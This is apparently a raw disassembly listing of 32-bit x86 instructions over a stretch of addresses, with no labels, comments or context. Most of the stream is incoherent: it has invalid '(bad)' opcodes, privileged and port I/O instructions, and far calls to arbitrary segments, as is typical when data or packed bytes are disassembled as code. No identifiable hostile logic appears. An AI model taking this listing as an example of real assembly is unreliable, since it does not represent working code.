  41545d:	sub    dh,BYTE PTR [esi]
  41545f:	ret    
  415460:	aas    
  415461:	pop    ds
  415462:	test   al,0xac
  415464:	sbb    esi,edi
  415466:	mov    ds:0x419bcf58,al
  41546b:	lods   eax,DWORD PTR ds:[esi]
  41546c:	xor    eax,0x2a9d7c73
  415471:	mov    ss,WORD PTR [ebx+0x39540cf1]
  415477:	lods   eax,DWORD PTR ds:[esi]
  415478:	int3   
  415479:	cmp    ch,BYTE PTR [esi-0x20a430db]
  41547f:	aas    
  415480:	nop
  415481:	not    al
  415483:	bound  esp,QWORD PTR [esi]
  415485:	and    eax,0x144163df
  41548a:	add    BYTE PTR [eax],al
  41548c:	xor    BYTE PTR [ebx-0x2f],cl
  41548f:	add    BYTE PTR [eax+0x77],ah
  415492:	std    
  415493:	fidivr WORD PTR [eax]
  415495:	adc    ecx,edi
  415497:	jne    0x4154e0
  415499:	outs   dx,BYTE PTR ds:[esi]
  41549a:	repnz (bad) 
  41549d:	push   es
  41549e:	std    
  41549f:	nop
  4154a0:	sbb    BYTE PTR [ebx],ch
  4154a2:	push   ebx
  4154a3:	lock rdmsr 
  4154a6:	push   ecx
  4154a7:	pop    ecx
  4154a8:	cld    
  4154a9:	add    BYTE PTR [eax],dh
  4154ab:	ins    DWORD PTR es:[edi],dx
  4154ac:	mov    WORD PTR [edi],ss
  4154ae:	mov    bh,0xdd
  4154b0:	mov    esi,ecx
  4154b2:	and    ebx,DWORD PTR [ebp+0x7a]
  4154b5:	xor    edi,ebp
  4154b7:	fstp   DWORD PTR [edi-0x4c448f7b]
  4154bd:	mov    eax,0x1f5cacf3
  4154c2:	jle    0x415514
  4154c4:	outs   dx,DWORD PTR gs:[esi]
  4154c6:	out    0x97,al
  4154c8:	(bad)  
  4154c9:	mov    cs,WORD PTR [edi-0x2d]
  4154cc:	push   es
  4154cd:	nop
  4154ce:	stos   BYTE PTR es:[edi],al
  4154cf:	push   esp
  4154d0:	aas    
  4154d1:	mov    edx,0x40ff6fa
  4154d6:	lahf   
  4154d7:	stos   DWORD PTR es:[edi],eax
  4154d8:	jmp    DWORD PTR [edi]
  4154da:	push   0xffffffae
  4154dc:	dec    ebp
  4154dd:	retf   
  4154de:	test   eax,0x86d04f04
  4154e3:	push   ss
  4154e4:	mov    dh,0x24
  4154e6:	inc    esp
  4154e7:	or     BYTE PTR [ebx+0x4fcf6726],0xae
  4154ee:	rep ins DWORD PTR es:[edi],dx
  4154f0:	(bad)  
  4154f1:	cld    
  4154f2:	enter  0xadd7,0xf
  4154f6:	sub    BYTE PTR [edi],dl
  4154f8:	ret    0xfa1a
  4154fb:	xchg   ebx,eax
  4154fc:	mov    al,ds:0xa0bd0b9
  415501:	je     0x415550
  415503:	sbb    esi,DWORD PTR [esi+0x640c86a9]
  415509:	fmul   st,st(5)
  41550b:	mov    cl,0x2d
  41550d:	mov    esi,0x3935559e
  415512:	sbb    DWORD PTR [esi-0x7623eb5b],esp
  415518:	lods   al,BYTE PTR ds:[esi]
  415519:	lods   eax,DWORD PTR ds:[esi]
  41551a:	fcom   QWORD PTR [eax]
  41551c:	mov    ebx,0x6b3cbd61
  415521:	inc    ebp
  415522:	iret   
  415523:	sub    BYTE PTR [ebx+0x14],bh
  415526:	js     0x41553e
  415528:	test   edx,0x68bf556d
  41552e:	rcl    BYTE PTR ds:0x13183b2,0x78
  415535:	icebp  
  415536:	outs   dx,DWORD PTR ds:[esi]
  415537:	dec    ebx
  415538:	ret    0x7146
  41553b:	dec    edx
  41553c:	mov    esp,0x7d2c17be
  415541:	cmp    al,0xe9
  415543:	es mov edi,0x17562e25
  415549:	lea    eax,[ecx-0x14]
  41554c:	dec    eax
  41554d:	lods   eax,DWORD PTR ds:[esi]
  41554e:	jp     0x4155ce
  415550:	fisttp WORD PTR [ecx+0x99d6a25]
  415556:	imul   ebx,DWORD PTR [ebx-0x5d3a5d46],0x78
  41555d:	adc    al,0x82
  41555f:	jle    0x4154ee
  415561:	cmp    BYTE PTR [ecx-0x58],ah
  415564:	and    BYTE PTR [ebx-0x52],ah
  415567:	pop    edi
  415568:	sub    ebx,DWORD PTR ds:0xf1dd608d
  41556e:	mov    al,ds:0x4de8ccf6
  415573:	cdq    
  415574:	loop   0x415538
  415576:	out    dx,eax
  415577:	add    BYTE PTR [ebx],dh
  415579:	xor    eax,0xd87840af
  41557e:	dec    edx
  41557f:	icebp  
  415580:	cmp    ch,BYTE PTR [eax-0x76d8e8a4]
  415586:	aas    
  415587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415588:	mov    esi,0x8de57f31
  41558d:	fdivr  DWORD PTR [esi-0x9658055]
  415593:	mov    esp,?
  415595:	(bad)  
  415596:	popf   
  415597:	jg     0x415615
  415599:	mov    bh,0x41
  41559b:	xchg   ebx,eax
  41559c:	call   FWORD PTR [esi+0x58025a5a]
  4155a2:	mov    cl,0x3e
  4155a4:	(bad)  
  4155a5:	cmp    dl,BYTE PTR [edx+0xc]
  4155a8:	inc    ebp
  4155a9:	mov    cl,0xf7
  4155ab:	test   ah,al
  4155ad:	adc    BYTE PTR [edx+0x6ca8ac1d],0x84
  4155b4:	cmp    dl,0xb9
  4155b7:	ja     0x4155ad
  4155b9:	cmp    al,0xce
  4155bb:	jge    0x4155ac
  4155bd:	xchg   edi,eax
  4155be:	js     0x4155a0
  4155c0:	mov    eax,ds:0x5917fe2d
  4155c5:	xchg   esp,eax
  4155c6:	xchg   ecx,eax
  4155c7:	mov    ebx,0x740eaf31
  4155cd:	sbb    al,0xf9
  4155cf:	xchg   edi,eax
  4155d0:	daa    
  4155d1:	mov    eax,0x68e12095
  4155d6:	retf   
  4155d7:	cmp    BYTE PTR [edi],bh
  4155d9:	iret   
  4155da:	scas   al,BYTE PTR es:[edi]
  4155db:	add    eax,DWORD PTR [ebp-0xb]
  4155de:	sbb    bl,0x6b
  4155e1:	retf   0x2f79
  4155e4:	std    
  4155e5:	push   edi
  4155e6:	ret    
  4155e7:	push   esi
  4155e8:	test   DWORD PTR [ebx+0x221f21db],esi
  4155ee:	pop    es
  4155ef:	pop    esp
  4155f0:	mov    ds,WORD PTR [eax]
  4155f2:	dec    edi
  4155f3:	jbe    0x415633
  4155f5:	pop    es
  4155f6:	mov    esi,0xdca93d3b
  4155fb:	sti    
  4155fc:	mov    eax,0x5d34cc6f
  415601:	clc    
  415602:	and    eax,0xb8d5d7d1
  415607:	sti    
  415608:	dec    ebx
  415609:	inc    edi
  41560a:	fidivr WORD PTR [esi]
  41560c:	xchg   edi,eax
  41560d:	push   ss
  41560e:	vpaddq ymm0,ymm4,YMMWORD PTR [eax+eiz*2+0x40]
  415615:	xchg   DWORD PTR [edx+ecx*8-0xbe0ddeb],ecx
  41561c:	jge    0x4155ae
  41561e:	cmp    al,0xef
  415620:	mov    dh,0x2e
  415622:	arpl   WORD PTR [ecx-0x56958f43],dx
  415628:	and    al,0xa8
  41562a:	loope  0x415669
  41562c:	adc    BYTE PTR [ebp+0x77],bl
  41562f:	add    al,BYTE PTR [eax]
  415631:	(bad)  
  415632:	mov    al,0xe3
  415634:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415635:	aad    0xc8
  415637:	es scas al,BYTE PTR es:[edi]
  415639:	rcl    BYTE PTR ds:0x9757130d,cl
  41563f:	xor    dh,dh
  415641:	arpl   WORD PTR [ebx*4-0x41eaa0ff],dx
  415648:	or     al,0x8b
  41564a:	std    
  41564b:	pop    eax
  41564c:	or     eax,0xf9b5c601
  415651:	enter  0x5652,0x1b
  415655:	aas    
  415656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415657:	inc    ebx
  415658:	dec    esi
  415659:	add    ebp,DWORD PTR [eax]
  41565b:	and    DWORD PTR [ebx+eiz*8],ebx
  41565e:	push   es
  41565f:	ret    0xc0aa
  415662:	fmul   st(2),st
  415664:	mov    bh,0x66
  415666:	pop    eax
  415667:	push   ebx
  415668:	jb     0x41567b
  41566a:	push   esp
  41566b:	mov    ebx,0x746134
  415670:	mov    dl,0xf7
  415672:	icebp  
  415673:	mov    edx,0x5504c3c9
  415678:	xchg   esp,eax
  415679:	jge    0x415625
  41567b:	sbb    dl,BYTE PTR [esi-0x29105a2f]
  415681:	call   0xfe79:0xeca2dd05
  415688:	push   esi
  415689:	or     DWORD PTR [ecx],ebx
  41568b:	fisubr DWORD PTR [edx+eax*4-0x6fb9c7fe]
  415692:	xchg   edi,eax
  415693:	xor    esp,esp
  415695:	pop    eax
  415696:	out    0xc4,al
  415698:	mov    al,0xec
  41569a:	fiadd  WORD PTR [edi+0x353aca3b]
  4156a0:	jecxz  0x4156be
  4156a2:	fs push ecx
  4156a4:	lods   eax,DWORD PTR ds:[esi]
  4156a5:	lods   al,BYTE PTR ds:[esi]
  4156a6:	push   edx
  4156a7:	retf   
  4156a8:	ss jne 0x4156af
  4156ab:	aad    0xe8
  4156ad:	sub    eax,0x96046dab
  4156b2:	dec    ebp
  4156b3:	scas   al,BYTE PTR es:[edi]
  4156b4:	clc    
  4156b5:	jnp    0x415724
  4156b7:	sbb    eax,0x88b7e59f
  4156bc:	add    al,0x81
  4156be:	mov    DWORD PTR [edx+0xb37bd5d],ecx
  4156c4:	xchg   esp,eax
  4156c5:	dec    esi
  4156c6:	dec    edx
  4156c7:	cmp    eax,0x6bec5bc5
  4156cc:	jmp    0x75afac6f
  4156d1:	(bad)  
  4156d2:	sub    dh,ah
  4156d4:	fld    QWORD PTR ds:0xfcfe81f5
  4156da:	call   0x81dbd440
  4156df:	dec    esi
  4156e0:	add    BYTE PTR [ebx],dl
  4156e2:	jp     0x4156f6
  4156e4:	inc    edi
  4156e5:	mov    eax,0x216507b4
  4156ea:	stc    
  4156eb:	jecxz  0x4156b0
  4156ed:	loope  0x415734
  4156ef:	and    edx,DWORD PTR [ecx+0x2c]
  4156f2:	sbb    ah,BYTE PTR ds:0xf9f10f70
  4156f8:	fimul  DWORD PTR [eax+0x317e5661]
  4156fe:	(bad)  
  4156ff:	ss adc al,0x7c
  415702:	out    dx,al
  415703:	ja     0x41568d
  415705:	call   0xc78e8af0
  41570a:	pop    edi
  41570b:	gs cmp al,0x11
  41570e:	mov    BYTE PTR [edi-0x62],bh
  415711:	(bad)  
  415712:	dec    ebp
  415713:	sbb    esp,esp
  415715:	mov    al,ds:0xe6908cdf
  41571a:	loop   0x4156ac
  41571c:	xor    bl,BYTE PTR [ebp+0x7d]
  41571f:	push   cs
  415720:	ret    
  415721:	not    DWORD PTR [edx+0x19cea8c6]
  415727:	fdiv   st,st(7)
  415729:	xchg   edi,eax
  41572a:	mov    esp,0xdbd67c25
  41572f:	cdq    
  415730:	mov    esp,0x65f810e7
  415735:	mov    cl,0xff
  415737:	sti    
  415738:	mul    ah
  41573a:	iret   
  41573b:	jmp    0x4156db
  41573d:	ds gs push ss
  415740:	test   DWORD PTR [ecx],0x638219f7
  415746:	sub    al,0xb2
  415748:	add    BYTE PTR [edi+eax*4],bh
  41574b:	adc    eax,0x81fced02
  415750:	les    eax,FWORD PTR [ebx-0x2f379092]
  415756:	push   ds
  415757:	xchg   edx,eax
  415758:	sbb    BYTE PTR [ecx],cl
  41575a:	cmc    
  41575b:	jl     0x41576c
  41575d:	xchg   esp,eax
  41575e:	push   esi
  41575f:	in     eax,0x67
  415761:	sub    eax,DWORD PTR [ebx-0x40ee6db6]
  415767:	push   edx
  415768:	aam    0x37
  41576a:	call   0x6bcd:0x39aa45b9
  415771:	cmc    
  415772:	mov    al,ds:0xeaa9d6b1
  415777:	inc    edx
  415778:	int3   
  415779:	cmp    al,0xed
  41577b:	and    eax,0x2c2ce0c9
  415780:	fmul   QWORD PTR [edx+0x706b3c99]
  415786:	adc    BYTE PTR [eax-0x59],ch
  415789:	add    edx,DWORD PTR [edi+0x18]
  41578c:	mov    ch,0x46
  41578e:	lea    esp,[ebx]
  415790:	pop    ebp
  415791:	dec    ebx
  415792:	in     eax,0xb9
  415794:	test   bh,bl
  415796:	mov    fs:0xaa6e4bf,al
  41579c:	mov    ebx,0xc10f057d
  4157a1:	dec    DWORD PTR [ecx-0x376b3c92]
  4157a7:	ins    BYTE PTR es:[edi],dx
  4157a8:	push   es
  4157a9:	and    ah,BYTE PTR ds:0x8f975f3b
  4157af:	outs   dx,DWORD PTR ds:[esi]
  4157b0:	xor    BYTE PTR [esi+0x3e],ah
  4157b3:	sub    dh,al
  4157b5:	push   esp
  4157b6:	int3   
  4157b7:	push   ebp
  4157b8:	jnp    0x415815
  4157ba:	pop    ss
  4157bb:	push   0x27
  4157bd:	pushf  
  4157be:	or     edx,DWORD PTR [edx-0x4c]
  4157c1:	xor    esp,DWORD PTR [edx+edx*8-0x4a]
  4157c5:	pop    esp
  4157c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157c7:	adc    al,0x50
  4157c9:	pop    ss
  4157ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157cb:	scas   eax,DWORD PTR es:[edi]
  4157cc:	aam    0xe3
  4157ce:	mov    dh,0xe
  4157d0:	pop    edi
  4157d1:	popa   
  4157d2:	adc    BYTE PTR [eax],bl
  4157d4:	cmp    DWORD PTR [ebx-0x71],ebx
  4157d7:	mov    al,0x10
  4157d9:	shl    DWORD PTR [esi-0x3e],0x9c
  4157dd:	(bad)  
  4157de:	xor    BYTE PTR [edi-0x26],ah
  4157e1:	fs pop esp
  4157e3:	pop    edi
  4157e4:	out    0xac,eax
  4157e6:	cmc    
  4157e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157e8:	enter  0xe457,0x2f
  4157ec:	dec    esp
  4157ed:	adc    dl,BYTE PTR [eax+0x25]
  4157f0:	cmp    ah,BYTE PTR [eax-0x13]
  4157f3:	dec    edi
  4157f4:	ja     0x4157c6
  4157f6:	out    0x49,al
  4157f8:	jle    0x41584d
  4157fa:	and    ah,bl
  4157fc:	and    DWORD PTR [ecx+0x6f],0x839f3c70
  415803:	scas   eax,DWORD PTR es:[edi]
  415804:	(bad)
  415808:	mov    esi,0x32bf9140
  41580d:	inc    ebx
  41580e:	pop    esp
  41580f:	xchg   esi,eax
  415810:	add    DWORD PTR [esi-0x4ad24a9a],esi
  415816:	inc    edx
  415817:	xor    BYTE PTR [eax+0x6d],bl
  41581a:	dec    esi
  41581b:	fst    DWORD PTR [edx+eiz*4]
  41581e:	pop    edx
  41581f:	mov    ecx,0x2bf302e8
  415824:	fidiv  DWORD PTR [ebp+0x30c0a472]
  41582a:	mov    bl,0xce
  41582c:	jl     0x4158ad
  41582e:	pushf  
  41582f:	xor    DWORD PTR [ebx+ecx*1-0x410207e7],edx
  415836:	cli    
  415837:	or     al,0x15
  415839:	adc    eax,0x5254436e
  41583e:	or     esp,DWORD PTR [esi]
  415840:	sbb    ah,ch
  415842:	and    eax,0x22637f2
  415847:	iret   
  415848:	adc    eax,0xa1c6ea22
  41584d:	(bad)  [edx+ebx*1+0x1c]
  415851:	in     eax,0x99
  415853:	cli    
  415854:	jge    0x4158a9
  415856:	sbb    DWORD PTR [esi-0x76cab8c1],eax
  41585c:	sbb    eax,eax
  41585e:	pop    ebx
  41585f:	inc    edi
  415860:	pop    ebp
  415861:	push   ebx
  415862:	xlat   BYTE PTR ds:[ebx]
  415863:	jnp    0x41584c
  415865:	and    ch,BYTE PTR [edx]
  415867:	mov    ds:0xa54fa87,al
  41586c:	push   ebx
  41586d:	(bad)  
  41586f:	out    0x45,al
  415871:	jmp    0xd7cda6a9
  415876:	test   al,0x7
  415878:	pop    esi
  415879:	sti    
  41587a:	cmp    ch,BYTE PTR ds:0x723b681
  415880:	add    bl,0x70
  415883:	les    eax,FWORD PTR [esi+0x5ce39c06]
  415889:	pop    ecx
  41588a:	(bad)  
  41588c:	jns    0x4158a0
  41588e:	xlat   BYTE PTR ds:[ebx]
  41588f:	mov    ah,BYTE PTR [ecx+edx*2]
  415892:	jo     0x415845
  415894:	sub    BYTE PTR [ecx],bl
  415896:	lahf   
  415897:	xor    ebp,DWORD PTR [edx+0x5e]
  41589a:	xor    bl,BYTE PTR [ebx+0x622ffa47]
  4158a0:	jle    0x41583b
  4158a2:	repz push 0xffffff8b
  4158a5:	adc    eax,0x59b35b66
  4158aa:	push   ss
  4158ab:	ret    0xba94
  4158ae:	add    bh,dh
  4158b0:	clc    
  4158b1:	scas   al,BYTE PTR es:[edi]
  4158b2:	jmp    0x4158f7
  4158b4:	sub    ebx,eax
  4158b6:	in     eax,dx
  4158b7:	jnp    0x4158b4
  4158b9:	call   0xa1a9bb7e
  4158be:	cld    
  4158bf:	adc    al,0x90
  4158c1:	inc    ebp
  4158c2:	lds    ebx,FWORD PTR [edx+0x21]
  4158c5:	cs fsub st(2),st
  4158c8:	test   WORD PTR [ecx],sp
  4158cb:	sub    eax,0x8cd2588c
  4158d0:	cwde   
  4158d1:	out    dx,al
  4158d2:	rcl    BYTE PTR [edx],cl
  4158d4:	js     0x4158ce
  4158d6:	dec    esp
  4158d7:	push   esi
  4158d8:	push   edi
  4158d9:	add    ch,BYTE PTR [ebx-0x19]
  4158dc:	pusha  
  4158dd:	inc    ecx
  4158de:	sbb    ebx,DWORD PTR [ebx+0x40]
  4158e1:	jb     0x41594c
  4158e3:	sub    al,0x55
  4158e5:	out    dx,eax
  4158e6:	call   0x8ad:0xdbb3901b
  4158ed:	aad    0x86
  4158ef:	shl    DWORD PTR [ebp+ebp*4-0x60],0xc3
  4158f4:	sub    bh,BYTE PTR [esi+0x7ddfdcb]
  4158fa:	ds xchg esi,eax
  4158fc:	xor    edx,edx
  4158fe:	xchg   ebx,eax
  4158ff:	jmp    0x88d7:0xefc979d
  415906:	leave  
  415907:	or     ebx,DWORD PTR [edi-0x50]
  41590a:	lock gs xchg esp,edi
  41590e:	fcom   QWORD PTR [ecx]
  415910:	ins    DWORD PTR es:[edi],dx
  415911:	push   eax
  415912:	adc    al,0x1
  415914:	mov    dh,0x2d
  415916:	push   ecx
  415917:	inc    edi
  415918:	pop    ecx
  415919:	hlt    
  41591a:	call   0x8444:0x1e9da291
  415921:	jge    0x415944
  415923:	inc    ecx
  415924:	sbb    BYTE PTR [esi+edx*8],dh
  415927:	or     BYTE PTR [esi+0x1d],ch
  41592a:	fild   QWORD PTR [esi]
  41592c:	out    0xcd,eax
  41592e:	pop    eax
  41592f:	jae    0x415914
  415931:	das    
  415932:	into   
  415933:	jg     0x415946
  415935:	sar    BYTE PTR [eax],1
  415937:	xchg   ebx,eax
  415938:	pop    edx
  415939:	pop    ss
  41593a:	or     eax,0x65dfd287
  41593f:	loope  0x415954
  415941:	mov    dl,0x59
  415944:	mov    ah,0xac
  415946:	adc    BYTE PTR [esi+ebp*8+0x6a],ch
  41594a:	popf   
  41594b:	push   edi
  41594c:	xor    ch,BYTE PTR [edx]
  41594e:	out    0xb6,al
  415950:	push   0xdcc59c72
  415955:	push   ecx
  415956:	pop    esp
  415957:	fld    DWORD PTR [esi-0x2f]
  41595a:	out    dx,eax
  41595b:	lods   eax,DWORD PTR ds:[esi]
  41595c:	outs   dx,DWORD PTR ds:[esi]
  41595d:	push   ds
  41595e:	or     DWORD PTR [esi],esp
  415960:	popf   
  415961:	arpl   sp,di
  415963:	enter  0x10c0,0xdd
  415967:	push   edx
  415968:	pop    edi
  415969:	sbb    al,0xe2
  41596b:	push   es
  41596c:	push   esi
  41596d:	imul   eax,DWORD PTR [ebp+0x1a344045],0x72fe6e23
  415977:	sti    
  415978:	in     al,dx
  415979:	jne    0x41597c
  41597b:	aaa    
  41597c:	aad    0x33
  41597e:	mov    edi,es
  415980:	nop
  415981:	aad    0x32
  415983:	outs   dx,DWORD PTR ds:[esi]
  415984:	pusha  
  415985:	cwde   
  415986:	push   ecx
  415987:	rcr    DWORD PTR [ecx+0x13],cl
  41598a:	or     BYTE PTR [ebx-0x72f82fac],bl
  415990:	add    BYTE PTR [edx+0x14],dl
  415993:	dec    ebp
  415994:	fxch   st(7)
  415996:	sbb    ecx,ecx
  415998:	dec    esp
  415999:	retf   0x20d4
  41599c:	sbb    al,0x7
  41599e:	sbb    DWORD PTR [esi],ecx
  4159a0:	mov    ch,bl
  4159a2:	sub    al,0xd3
  4159a4:	adc    al,0x28
  4159a6:	or     eax,0xebf0ca1c
  4159ab:	daa    
  4159ac:	out    0xf9,eax
  4159ae:	lods   al,BYTE PTR ds:[esi]
  4159af:	sbb    al,0x14
  4159b1:	(bad)  
  4159b2:	sub    eax,0xeaec208d
  4159b7:	xor    eax,0x2ca5298c
  4159bc:	sar    edx,1
  4159be:	das    
  4159bf:	dec    ecx
  4159c0:	popa   
  4159c1:	test   al,0x96
  4159c3:	shr    DWORD PTR [ecx-0xc],1
  4159c6:	fcom   QWORD PTR [ebp+0x4835d761]
  4159cc:	adc    esi,ebp
  4159ce:	mov    al,ds:0x8b793a70
  4159d3:	popf   
  4159d4:	push   cs
  4159d5:	rcr    bh,cl
  4159d7:	adc    al,0xd4
  4159d9:	fs sti 
  4159db:	cmp    eax,0x2d450eb1
  4159e0:	ins    DWORD PTR es:[edi],dx
  4159e1:	jno    0x415a29
  4159e3:	xor    BYTE PTR [esi],bh
  4159e5:	mov    ebx,0xf881dffd
  4159ea:	ror    DWORD PTR [edi+eiz*8-0x6f864d93],cl
  4159f1:	in     eax,dx
  4159f2:	pop    esp
  4159f3:	adc    DWORD PTR [edi+edi*2],ebp
  4159f6:	ds push ds
  4159f8:	lwpval edx,DWORD PTR [edx],0xb8fc3d71
  415a01:	icebp  
  415a02:	jns    0x415a10
  415a04:	xor    DWORD PTR [eax+0x6f],edx
  415a07:	adc    al,0xa1
  415a09:	clc    
  415a0a:	pusha  
  415a0b:	pop    esp
  415a0c:	ins    BYTE PTR es:[edi],dx
  415a0d:	fsub   QWORD PTR [edx-0x1bc75672]
  415a13:	mov    dl,0xc1
  415a15:	test   DWORD PTR [eax],0xfe37e389
  415a1b:	mov    ebp,0xbd3425c0
  415a20:	in     eax,dx
  415a21:	pop    esp
  415a22:	push   es
  415a23:	add    al,0xb7
  415a25:	xor    eax,0xec5a3d6d
  415a2a:	pop    eax
  415a2b:	or     al,0x25
  415a2d:	push   ebx
  415a2e:	repz sar BYTE PTR [edi],0xbf
  415a32:	adc    DWORD PTR [ebp+0x20e8fbe2],edi
  415a38:	push   ebx
  415a39:	xchg   edi,eax
  415a3a:	in     al,0x7c
  415a3c:	push   ecx
  415a3d:	mov    edx,0xde85c8dc
  415a42:	lods   al,BYTE PTR ds:[esi]
  415a43:	repnz aad 0x98
  415a46:	popa   
  415a47:	cmp    BYTE PTR [ebp-0x7d],bl
  415a4a:	and    DWORD PTR [edx-0x687da09f],ecx
  415a50:	repz add DWORD PTR [edi+ebp*4],eax
  415a54:	push   0xffffffaf
  415a56:	shl    DWORD PTR [edi],0x16
  415a59:	je     0x4159ed
  415a5b:	(bad)  
  415a5c:	cmc    
  415a5d:	add    dh,BYTE PTR [edi]
  415a5f:	arpl   cx,sp
  415a61:	sbb    al,0x1a
  415a63:	push   ebp
  415a64:	cli    
  415a65:	test   eax,0x560aa395
  415a6a:	in     eax,dx
  415a6b:	push   ecx
  415a6c:	bound  esp,QWORD PTR [ebx-0x2f]
  415a6f:	mov    esi,0xec0f7210
  415a74:	aaa    
  415a75:	ret    
  415a76:	pop    esp
  415a77:	lea    edx,[ecx-0x6dd7ba5e]
  415a7d:	stc    
  415a7e:	retf   0x4d14
  415a81:	jl     0x415aa1
  415a83:	aad    0xbb
  415a85:	in     al,dx
  415a86:	sub    DWORD PTR [eax-0x30d15e0b],0x76daebf6
  415a90:	outs   dx,DWORD PTR ds:[esi]
  415a91:	daa    
  415a92:	sti    
  415a93:	jne    0x415aea
  415a95:	pop    DWORD PTR [esi]
  415a97:	mov    ebp,0x73b8f3e9
  415a9c:	and    dh,BYTE PTR [ebx+ebx*4+0x6301af54]
  415aa3:	out    dx,eax
  415aa4:	push   ebx
  415aa5:	sti    
  415aa6:	cmp    al,0x96
  415aa8:	out    dx,al
  415aa9:	adc    BYTE PTR [edx-0x73],ah
  415aac:	jmp    0x415b1f
  415aae:	sahf   
  415aaf:	popa   
  415ab0:	stos   BYTE PTR es:[edi],al
  415ab1:	xor    dl,al
  415ab3:	pop    es
  415ab4:	cmc    
  415ab5:	loope  0x415a7a
  415ab7:	call   FWORD PTR [edx+0x43be50b0]
  415abd:	pop    es
  415abe:	pop    ds
  415abf:	jmp    0xdeef1adb
  415ac4:	and    ecx,edi
  415ac6:	iret   
  415ac7:	pushf  
  415ac8:	jge    0x415ab3
  415aca:	popf   
  415acb:	jg     0x415aa9
  415acd:	xchg   ebx,eax
  415ace:	inc    eax
  415acf:	and    eax,0xa41afadf
  415ad4:	xchg   edx,eax
  415ad5:	(bad)  
  415ad6:	shl    BYTE PTR [edx+0xf0308aa],0xad
  415add:	cld    
  415ade:	loop   0x415ae3
  415ae0:	pop    eax
  415ae1:	add    DWORD PTR [ebx+edx*4+0x32e454a9],eax
  415ae8:	sub    eax,0xf2ee2abd
  415aed:	(bad)  
  415aef:	jp     0x415ad7
  415af1:	ins    DWORD PTR es:[edi],dx
  415af2:	pop    ecx
  415af3:	mov    ch,0x76
  415af5:	and    ebx,ecx
  415af7:	jmp    0xb707:0x6c68fb00
  415afe:	jns    0x415b19
  415b00:	scas   eax,DWORD PTR es:[edi]
  415b01:	push   ss
  415b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b03:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b05:	and    ecx,DWORD PTR [ebp-0x471f65ff]
  415b0b:	sub    al,0xac
  415b0d:	mov    ebp,0x16d03e5a
  415b12:	jecxz  0x415ac7
  415b14:	rcl    BYTE PTR es:[ecx],cl
  415b17:	inc    ebp
  415b18:	gs ja  0x415aea
  415b1b:	ja     0x415acb
  415b1d:	rol    dl,cl
  415b1f:	ja     0x415ad6
  415b21:	jl     0x415b23
  415b23:	adc    ch,cl
  415b25:	(bad)  
  415b26:	imul   eax,DWORD PTR [edx],0x1bc14695
  415b2c:	fdivp  st(2),st
  415b2e:	sti    
  415b2f:	sub    bl,BYTE PTR ss:[ecx]
  415b32:	lock mov ecx,0xfda63268
  415b38:	dec    edx
  415b39:	stos   DWORD PTR es:[edi],eax
  415b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b3b:	repz jnp 0x415b57
  415b3e:	call   0x1f43:0x8e46eb47
  415b45:	jns    0x415bbc
  415b47:	inc    ebp
  415b48:	or     eax,0x54152c90
  415b4d:	add    BYTE PTR [esi],ch
  415b4f:	xor    dl,BYTE PTR [ebp+eax*2+0x6]
  415b53:	test   DWORD PTR [eax],edi
  415b55:	out    dx,eax
  415b56:	pop    eax
  415b57:	dec    ecx
  415b58:	mov    BYTE PTR fs:[esi],dl
  415b5b:	out    0x3f,eax
  415b5d:	inc    ebx
  415b5e:	cmp    eax,0x15ad7478
  415b63:	ret    0xb691
  415b66:	in     al,dx
  415b67:	pop    es
  415b68:	xchg   edx,eax
  415b69:	jo     0x415b85
  415b6b:	xor    edx,edi
  415b6d:	sbb    al,BYTE PTR [edx]
  415b6f:	(bad)  
  415b70:	pop    esi
  415b71:	cld    
  415b72:	int    0x21
  415b74:	sbb    al,0x13
  415b76:	jmp    0xdc857bd7
  415b7b:	mov    ds:0x529435ac,al
  415b80:	outs   dx,DWORD PTR ds:[esi]
  415b81:	push   eax
  415b82:	dec    edx
  415b83:	test   eax,0xc3da0552
  415b88:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  415b8a:	popf   
  415b8b:	movsx  ebp,ax
  415b8e:	xchg   ecx,eax
  415b8f:	retf   
  415b90:	inc    esi
  415b91:	pop    edx
  415b92:	addr16 push ebx
  415b94:	xchg   esi,eax
  415b95:	int    0xae
  415b97:	aaa    
  415b98:	fsubr  st(0),st
  415b9a:	aad    0x36
  415b9c:	inc    esp
  415b9d:	xchg   esp,eax
  415b9e:	inc    eax
  415b9f:	dec    ecx
  415ba0:	lods   al,BYTE PTR ds:[esi]
  415ba1:	shr    DWORD PTR [esi-0x66],1
  415ba4:	enter  0xaa40,0xe2
  415ba8:	enter  0x619c,0xb4
  415bac:	mov    ds:0x2ac78f29,eax
  415bb1:	xchg   esp,eax
  415bb2:	adc    ah,ch
  415bb4:	xchg   BYTE PTR [edi+0x5d1fd0bd],al
  415bba:	dec    eax
  415bbb:	out    0x4f,eax
  415bbd:	sub    DWORD PTR [ebp-0xf],ebp
  415bc0:	inc    edx
  415bc1:	jne    0x415bee
  415bc3:	fs sub dl,ah
  415bc6:	mov    bl,0x65
  415bc8:	outs   dx,BYTE PTR ds:[esi]
  415bc9:	jae    0x415be0
  415bcb:	outs   dx,BYTE PTR ds:[esi]
  415bcc:	jecxz  0x415bae
  415bce:	add    DWORD PTR [ebp+0x5a3b5a4a],ebx
  415bd4:	pop    esi
  415bd5:	cmc    
  415bd6:	dec    edi
  415bd7:	mov    edx,0x8c564ee7
  415bdc:	push   ecx
  415bdd:	pushf  
  415bde:	ror    BYTE PTR [esi+0x3ce9d082],cl
  415be4:	inc    ebp
  415be5:	push   ds
  415be6:	and    BYTE PTR [edi-0x6619d387],0xc
  415bed:	sbb    al,0x5e
  415bef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bf0:	fld    TBYTE PTR [edx]
  415bf2:	jae    0x415be0
  415bf4:	jge    0x415bf7
  415bf6:	pop    edi
  415bf7:	fmul   QWORD PTR [eax-0x10719b49]
  415bfd:	loop   0x415bca
  415bff:	clc    
  415c00:	pop    edx
  415c01:	jge    0x415c11
  415c03:	test   eax,0xabf3d696
  415c08:	adc    esi,DWORD PTR [esi]
  415c0a:	add    DWORD PTR [esi],eax
